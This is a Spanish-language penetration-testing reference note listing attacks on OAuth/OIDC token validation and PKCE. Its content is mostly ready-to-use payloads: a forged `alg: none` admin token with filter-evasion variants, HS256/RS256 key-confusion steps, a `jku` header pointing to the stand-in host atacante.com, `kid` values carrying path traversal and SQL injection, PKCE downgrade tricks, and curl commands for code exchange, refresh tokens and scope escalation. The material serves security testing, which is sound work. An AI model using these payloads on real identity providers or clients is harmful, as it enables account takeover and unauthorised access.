---
tipo: meta
aliases:
  - OIDC tokens
  - PKCE downgrade
  - alg none
tags:
  - meta/referencia
  - dominio/web
---

# OAuth tokens - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué se toca en el `id_token`, en el canje y en PKCE. El criterio está en [[OAuth - validación del id_token]] y [[OAuth - PKCE ausente o degradado]]; la mecánica de firmar JWT, en [[JWT - matriz de referencia]].

## 1. Anatomía del `id_token`

```json
{
  "iss": "https://proveedor.com",
  "sub": "1234567890",
  "aud": "client_id_del_cliente",
  "exp": 1786000000,
  "iat": 1785996400,
  "nonce": "789",
  "email": "victima@objetivo.com",
  "email_verified": true
}
```

```sh
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq
```

## 2. Las cinco comprobaciones, una prueba cada una

| Se toca | Payload | Si pasa |
|---|---|---|
| Firma | `alg: none`, firma vacía | No se verifica nada |
| Firma | Firmar HS256 con la clave pública RSA | Confusión de algoritmo |
| `iss` | Cambiar por un emisor propio | No se comprueba el emisor |
| `aud` | Token emitido para otro cliente | No se comprueba la audiencia |
| `nonce` | Reusar un token capturado | Sin protección de repetición |
| `exp` | Token vencido | No se comprueba la expiración |
| `sub` | Cambiar el identificador de sujeto | Cuenta ajena directa |
| `email` | Correo de la víctima, `email_verified: false` | Se confía en el correo sin verificar |

Los payloads concretos de firma están en [[JWT - matriz de referencia]] — son los mismos, cambia dónde se presentan.

## 3. `alg: none`

```json
{"alg":"none","typ":"JWT"}
```

`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.`

El punto final va y el tercer segmento queda vacío. Variantes que evaden filtros que comparan la cadena literal:

`"alg":"None"` · `"alg":"NONE"` · `"alg":"nOnE"` · `"alg":"none "`

## 4. Confusión de algoritmo

El token dice RS256 y el verificador acepta el que le propongan. Se cambia a HS256 y se firma con **la clave pública** del proveedor, que es información pública.

```sh
curl -s https://proveedor/.well-known/jwks.json | jq
```

Convertir el JWK a PEM y firmar con ese archivo como secreto HMAC. La clave sale del `jwks_uri` del documento de descubrimiento — ver [[OAuth - matriz de reconocimiento]] § 1.

## 5. `jku` y `kid` — que el verificador use mi clave

```json
{"alg":"RS256","jku":"https://atacante.com/jwks.json","kid":"1"}
```

Si el verificador descarga las claves de la dirección que trae el token, se le sirve un juego propio y el token queda válido. La misma descarga, vista desde el servidor, es SSRF — [[OAuth - SSRF por registro dinámico]].

`"kid": "../../../../dev/null"` con firma HMAC vacía
`"kid": "key1' UNION SELECT 'clave-conocida'--"` si las claves salen de una base

## 6. Canje del código

```sh
curl -s -X POST https://proveedor/token \
  -d grant_type=authorization_code \
  -d code="$CODE" \
  -d redirect_uri=https://cliente.com/callback \
  -d client_id=abc123 \
  -d code_verifier="$VERIFIER"
```

Pruebas sobre el canje:

Sin `code_verifier` — ¿lo exige aunque la autorización lo haya pedido?
Con `code_verifier` arbitrario — ¿lo compara?
Con `redirect_uri` distinta de la de autorización — ¿la ata?
Con `client_id` de otro cliente — ¿ata el código al cliente?
El mismo código dos veces — ¿es de un solo uso?

## 7. PKCE

Generar el par:

```sh
VERIFIER=$(openssl rand -base64 60 | tr -d '\n=+/' | cut -c1-64)
CHALLENGE=$(printf '%s' "$VERIFIER" | openssl dgst -binary -sha256 | openssl base64 | tr '+/' '-_' | tr -d '=')
echo "verifier=$VERIFIER"
echo "challenge=$CHALLENGE"
```

Degradación, en orden de probabilidad:

| Prueba | Si pasa |
|---|---|
| `code_challenge_method=plain` | El desafío **es** el verificador. Ver el código alcanza |
| Quitar `code_challenge` de la autorización | PKCE es opcional |
| Quitar `code_verifier` del canje | No se exige aunque se haya pedido |
| Autorizar con `S256` y canjear declarando `plain` | No se compara el método entre las dos fases |

Con `plain`, el verificador es el mismo valor que viajó en la URL de autorización:

`code_challenge=abc123&code_challenge_method=plain` → `code_verifier=abc123`

## 8. Token de acceso y de refresco

`curl -s https://proveedor/userinfo -H "Authorization: Bearer $TOKEN"`
Qué identidad devuelve el token. Es la prueba de si está atado al cliente correcto.

`curl -s -X POST https://proveedor/introspect -d token="$TOKEN" -d client_id=... -d client_secret=...`
Devuelve `aud`, `scope` y `exp` reales. Muchos despliegues lo dejan sin autenticar.

Token de refresco:

```sh
curl -s -X POST https://proveedor/token \
  -d grant_type=refresh_token -d refresh_token="$RT" -d client_id=abc123
```

Probar si el token de refresco de un cliente sirve en otro, y si sigue vivo después de cerrar sesión. Un token de refresco que sobrevive al cierre de sesión es persistencia, y se cruza con [[Sesión - expiración insuficiente]].

## 9. Alcances

`scope=openid email profile offline_access` — pedir el token de refresco aunque el cliente no lo use
`scope=openid email profile admin` — pedir de más y ver si se concede

La respuesta del canje devuelve `scope` con lo realmente concedido. Si concede más de lo que la pantalla de consentimiento mostró, es hallazgo por sí solo.

## 10. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `invalid_token` con `alg: none` | Se verifica la firma. Ir a § 4 |
| El token forjado pasa y no hay sesión | El cliente valida algo más. Revisar `aud`, `iss`, `nonce` |
| `invalid_grant` en el canje | Código vencido, usado, o falta `code_verifier` |
| `unauthorized_client` | Ese tipo de concesión no está habilitado |
| La firma HS256 no valida | El PEM de la clave pública está mal convertido. Sin salto de línea final |
| `nonce mismatch` | Se valida. No hay repetición posible |
| El token de otro cliente funciona | No se comprueba `aud`. Hallazgo serio |
| `userinfo` devuelve otra identidad que la sesión | El cliente no deriva la identidad del token |

## Relacionadas

[[MOC - OAuth]] · [[OAuth - validación del id_token]] · [[OAuth - PKCE ausente o degradado]] · [[JWT - matriz de referencia]] · [[Sesión - matriz de referencia]]
